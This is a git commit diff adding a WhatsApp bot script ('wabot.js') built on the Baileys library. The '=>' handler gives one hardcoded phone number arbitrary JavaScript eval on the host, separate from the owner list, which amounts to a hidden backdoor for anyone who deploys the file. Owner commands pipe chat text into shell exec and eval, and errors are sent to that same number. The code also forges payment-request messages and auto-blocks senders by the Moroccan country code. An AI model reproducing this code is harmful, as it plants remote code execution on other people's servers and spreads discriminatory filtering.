00a1d347923e525671a126126c64d6214b147ee1
Your Name <you@example.com>
2023-07-29 22:06:02 -0600

    gay

---
+++ pa/wabot.js
@@ -0,0 +1,417 @@
+require('./settings')
+const { modul } = require('./module')
+const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
+const { exec, spawn, execSync } = child_process
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
+const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
+const { color, bgcolor } = require('./lib/color')
+const { fetchBuffer, buffergif } = require("./lib/myfunc2")
+const { msgFilter } = require('./lib/antispam')
+const vm = require('node:vm')
+const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
+const xeonverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
+global.db = JSON.parse(fs.readFileSync('./database/database.json'))
+if (global.db) global.db = {
+sticker: {},
+database: {}, 
+game: {},
+others: {},
+users: {},
+chats: {},
+settings: {},
+...(global.db || {})
+}
+
+// read database
+let tebaklagu = db.game.tebaklagu = []
+let kuismath = db.game.math = []
+let vote = db.others.vote = []
+
+module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
+try {
+const { type, quotedMsg, mentioned, now, fromMe } = m
+const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
+const budy = (typeof m.text == 'string' ? m.text : '')
+const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
+const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
+const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
+const messagesC = pes.slice(0).trim()
+const content = JSON.stringify(m.message)
+const isCmd = body.startsWith(prefix)
+const from = m.key.remoteJid
+const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
+const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+const args = body.trim().split(/ +/).slice(1)
+const pushname = m.pushName || "No Name"
+const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
+const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const XeonTheDeveloper = m.sender == botNumber ? true : false
+const text = q = args.join(" ")
+const quoted = m.quoted ? m.quoted : m
+const mime = (quoted.msg || quoted).mimetype || ''
+const qmsg = (quoted.msg || quoted)
+const isMedia = /image|video|sticker|audio/.test(mime)
+const isImage = (type == 'imageMessage')
+const isVideo = (type == 'videoMessage')
+const isAudio = (type == 'audioMessage')
+const isSticker = (type == 'stickerMessage')
+const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
+const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
+const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
+const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
+const senderNumber = sender.split('@')[0]
+const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
+const groupName = m.isGroup ? groupMetadata.subject : ''
+const participants = m.isGroup ? await groupMetadata.participants : ''
+const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
+const groupOwner = m.isGroup ? groupMetadata.owner : ''
+const groupMembers = m.isGroup ? groupMetadata.participants : ''
+const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
+const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+const isUser = xeonverifieduser.includes(sender)
+const banUser = await XeonBotInc.fetchBlocklist()
+const isBanned = banUser ? banUser.includes(m.sender) : false
+const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
+const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
+const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
+const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
+const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
+const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
+const isEval = body.startsWith('=>')
+   
+//TIME
+const xtime = moment.tz('America/Mexico_City').format('HH:mm:ss')
+const xdate = moment.tz('America/Mexico_City').format('DD/MM/YYYY')
+const time2 = moment().tz('America/Mexico_City').format('HH:mm:ss')  
+ if(time2 < "23:59:00"){
+var xeonytimewisher = `Good Night 🌌`
+ }
+ if(time2 < "19:00:00"){
+var xeonytimewisher = `Good Evening 🌃`
+ }
+ if(time2 < "18:00:00"){
+var xeonytimewisher = `Good Evening 🌃`
+ }
+ if(time2 < "15:00:00"){
+var xeonytimewisher = `Good Afternoon 🌅`
+ }
+ if(time2 < "11:00:00"){
+var xeonytimewisher = `Good Morning 🌄`
+ }
+ if(time2 < "05:00:00"){
+var xeonytimewisher = `Good Morning 🌄`
+ } 
+
+		if (isEval && senderNumber == "5215621341581") {
+			let evaled,
+				text = q,
+				{ inspect } = require('util')
+			try {
+				if (text.endsWith('--sync')) {
+					evaled = await eval(
+						`(async () => { ${text.trim.replace('--sync', '')} })`
+					)
+					m.reply(evaled)
+				}
+				evaled = await eval(text)
+				if (typeof evaled !== 'string') evaled = inspect(evaled)
+				await XeonBotInc.sendMessage(from, { text: evaled }, { quoted: m })
+			} catch (e) {
+				XeonBotInc.sendMessage(from, { text: String(e) }, { quoted: m })
+			}
+		}
+try {
+const isNumber = x => typeof x === 'number' && !isNaN(x)
+const user = global.db.users[m.sender]
+if (typeof user !== 'object') global.db.users[m.sender] = {}
+const chats = global.db.chats[m.chat]
+if (typeof chats !== 'object') global.db.chats[m.chat] = {}
+if (user) {
+if (!isNumber(user.afkTime)) user.afkTime = -1
+if (!('afkReason' in user)) user.afkReason = ''
+if (!("premium" in user)) user.premium = false
+} else global.db.users[m.sender] = {
+afkTime: -1,
+afkReason: '',
+premium: false
+}
+
+const setting = db.settings[botNumber]
+        if (typeof setting !== 'object') db.settings[botNumber] = {}
+	    if (setting) {
+    	    if (!('anticall' in setting)) setting.anticall = false
+    		if (!isNumber(setting.status)) setting.status = 0
+    		if (!('autobio' in setting)) setting.autobio = false
+	    } else global.db.settings[botNumber] = {
+    	    anticall: true,
+    		status: 0,
+    		autobio: false
+	    }
+
+} catch (err) {
+console.error(err)
+}
+
+if (!XeonBotInc.public) {
+if (!m.key.fromMe) return
+}
+
+//chat counter (console log)
+        if (m.message && m.isGroup) {
+            XeonBotInc.readMessages([m.key])
+            console.log(color(`\n< ================================================== >\n`, 'cyan'))
+			console.log(color(`Group Chat:`, 'green'))
+            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
+        } else {
+            XeonBotInc.readMessages([m.key])
+            console.log(color(`\n< ================================================== >\n`, 'cyan'))
+			console.log(color(`Private Chat:`, 'green'))
+            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
+        }
+
+if (isCmd && !isUser) {
+xeonverifieduser.push(sender)
+fs.writeFileSync('./database/user.json', JSON.stringify(xeonverifieduser, null, 2))
+}
+
+XeonBotInc.sendPresenceUpdate('unavailable', from)
+
+		// auto set bio
+	if (db.settings[botNumber].autobio) {
+	    let setting = global.db.settings[botNumber]
+	    if (new Date() * 1 - setting.status > 1000) {
+		let uptime = await runtime(process.uptime())
+		await XeonBotInc.updateProfileStatus(`${XeonBotInc.user.name} | Runtime : ${runtime(uptime)}`)
+		setting.status = new Date() * 1
+	    }
+	}
+
+//autoblock 212
+if (global.autoblockmorroco) {
+if (m.sender.startsWith('212')) return XeonBotInc.updateBlockStatus(m.sender, 'block')
+}
+
+//autokick 212
+if (global.autokickmorroco) {
+if (m.isGroup && m.sender.startsWith('212')) return XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+}
+
+//antispam kick
+if (global.antispam) {
+if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
+
+console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
+
+return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+}
+
+}
+
+async function sendXeonBotIncMessage(chatId, message, options = {}){
+    let generate = await generateWAMessage(chatId, message, options)
+    let type2 = getContentType(generate.message)
+    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
+    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
+    return await XeonBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
+}
+
+const reply = (teks) => {
+XeonBotInc.sendMessage(from, { text: teks ,
+contextInfo:{
+forwardingScore: 9999999, 
+isForwarded: true
+}
+}, { quoted : m })
+}
+
+const lep = {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+message: { 
+"imageMessage": { 
+"mimetype": "image/jpeg", 
+"caption":  `${ownername}`, 
+"jpegThumbnail": defaultpp
+}
+}
+}
+
+const ftext = { 
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...(from ? {
+remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
+message: { 
+extendedTextMessage: { 
+text: `${m.pushName}`, 
+title: `${m.pushName}`, 
+jpegThumbnail: defaultpp } } }
+
+const banRep = () => {
+XeonBotInc.sendMessage(m.chat, {
+text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
+mentions: [creator],
+},
+{
+quoted:m
+})
+}
+
+if (isCmd && isBanned) {
+return banRep()
+}
+
+let list = []
+for (let i of owner) {
+list.push({
+	    	displayName: await XeonBotInc.getName(i),
+	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
+	    })
+	}
+
+const repPy = {
+	key: {
+		remoteJid: '0@s.whatsapp.net',
+		fromMe: false,
+		id: `${ownername}`,
+		participant: '0@s.whatsapp.net'
+	},
+	message: {
+		requestPaymentMessage: {
+			currencyCodeIso4217: "USD",
+			amount1000: 999999999,
+			requestFrom: '0@s.whatsapp.net',
+			noteMessage: {
+				extendedTextMessage: {
+					text: `${botname}`
+				}
+			},
+			expiryTimestamp: 999999999,
+			amount: {
+				value: 91929291929,
+				offset: 1000,
+				currencyCode: "INR"
+			}
+		}
+	}
+}
+
+if (global.autoTyping) {
+if (command) {
+XeonBotInc.sendPresenceUpdate('composing', from)
+}
+}
+if (global.autoRecord) {
+if (command) {
+XeonBotInc.sendPresenceUpdate('recording', from)
+}
+}
+
+const pickRandom = (arr) => {
+return arr[Math.floor(Math.random() * arr.length)]
+}
+
+// Respon Cmd with media
+if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
+let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
+let { text, mentionedJid } = hash
+let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
+    userJid: XeonBotInc.user.id,
+    quoted: m.quoted && m.quoted.fakeObj
+})
+messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
+messages.key.id = m.key.id
+messages.pushName = m.pushName
+if (m.isGroup) messages.participant = m.sender
+let msg = {
+    ...chatUpdate,
+    messages: [proto.WebMessageInfo.fromObject(messages)],
+    type: 'append'
+}
+XeonBotInc.ev.emit('messages.upsert', msg)
+}
+
+switch (command) {
+case "hola" :
+m.reply("Que tal!!!");
+break
+default:
+
+if (budy.startsWith('<')) {
+if (!XeonTheCreator) return
+try {
+return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
+} catch (e) {
+m.reply(e)
+}
+}
+
+if (budy.startsWith('vv')) {
+if (!XeonTheCreator) return
+try {
+let evaled = await eval(budy.slice(2))
+if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+await m.reply(evaled)
+} catch (err) {
+m.reply(String(err))
+}
+}
+
+if (budy.startsWith('uu')){
+if (!XeonTheCreator) return
+qur = budy.slice(2)
+exec(qur, (err, stdout) => {
+if (err) return m.reply(`${err}`)
+if (stdout) {
+m.reply(stdout)
+}
+})
+}
+
+if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
+let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
+if (room) {
+let other = room.other(sender)
+m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
+contextInfo: {
+...m.msg.contextInfo,
+forwardingScore: 0,
+isForwarded: true,
+participant: other
+}
+} : {})
+}
+}
+
+if (isCmd && budy.toLowerCase() != undefined) {
+if (m.chat.endsWith('broadcast')) return
+if (m.isBaileys) return
+let msgs = global.db.database
+if (!(budy.toLowerCase() in msgs)) return
+XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+}
+}
+
+} catch (err) {
+console.log(util.format(err))
+let e = String(err)
+XeonBotInc.sendMessage("5215621341581@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+contextInfo:{
+forwardingScore: 9999999, 
+isForwarded: true
+}})
+}
+}
+
+process.on('uncaughtException', function (err) {
+console.log('Caught exception: ', err)
+})
